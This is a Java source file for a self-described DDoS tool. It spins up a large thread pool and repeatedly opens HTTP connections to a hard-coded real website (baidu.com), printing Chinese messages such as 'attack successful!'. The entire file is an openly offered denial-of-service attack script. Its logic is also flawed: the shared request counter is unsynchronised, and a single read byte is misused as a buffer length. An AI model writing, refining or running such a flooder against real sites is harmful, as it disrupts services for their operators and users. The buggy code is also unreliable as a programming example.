package net.itanken.ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDos {
    public DDos() {
    }
	public static int count = 0;
    
    public static void main(String[] args){
        ExecutorService es = Executors.newFixedThreadPool(1000);
        Mythread mythread = new Mythread("");
        Thread thread = new Thread(mythread);
        for(int i = 0;i<100;i++) {
            es.execute(thread);
        }
    }
}

class Mythread implements Runnable {
	private static String urlStr = "https://www.baidu.com/";
	public Mythread(String url) {
		if(!Utils.isEmptyStr(url)) {
			urlStr = url;
		}
	}
	
    public void run() {
        while(DDos.count < 100){
            try {
    			DDos.count++;
                URL url = new URL(urlStr);
                URLConnection conn = url.openConnection();
                System.out.println(DDos.count + " - 发包成功：" + url);
                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();
                if(bis != null){
                    if((len = bis.read()) != -1){
                        sb.append(new String (bytes,0,len));
                        System.out.println("攻击成功！" + sb.toString());
                        bis.close();
                    }
                }                    
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
            	System.out.println(e.getMessage());
                e.printStackTrace();
                if(e.getMessage().contains("Server returned HTTP response code")) {
                    System.out.println("请检查网站！");
                }
            }
            
        }
    }
}

class Utils {
	
	/**
	 * 检查字符串是否为空： null/"null"/""
	 * @param str
	 * @return boolean
	 */
	public final static boolean isEmptyStr(String str) {
		return ((str == null || str.trim().equalsIgnoreCase("null") || str.trim().equals("")) ? true : false);
	}
}